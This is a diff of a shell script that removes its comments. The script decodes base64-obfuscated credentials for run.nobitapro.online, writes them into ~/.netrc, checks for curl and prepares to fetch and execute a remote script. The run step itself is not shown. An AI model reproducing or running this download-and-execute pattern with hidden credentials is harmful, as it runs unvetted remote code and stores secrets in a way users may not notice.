@@ -6,7 +6,6 @@ URL="https://run.nobitapro.online"
 HOST="run.nobitapro.online"
 NETRC="${HOME}/.netrc"
 
-# --- helpers ---
 b64d() { printf '%s' "$1" | base64 -d; }
 
 USER_B64="bm9iaXRh"
@@ -20,13 +19,11 @@ if [ -z "$USER_RAW" ] || [ -z "$PASS_RAW" ]; then
   exit 1
 fi
 
-# Ensure curl exists
 if ! command -v curl >/dev/null 2>&1; then
   echo "Error: curl is required but not installed." >&2
   exit 1
 fi
 
-# Prepare ~/.netrc with strict perms
 touch "$NETRC"
 chmod 600 "$NETRC"
 
@@ -40,7 +37,6 @@ mv "$tmpfile" "$NETRC"
   printf 'password %s\n' "$PASS_RAW"
 } >> "$NETRC"
 
-# Fetch and execute safely
 script_file="$(mktemp)"
 cleanup() { rm -f "$script_file"; }
 trap cleanup EXIT
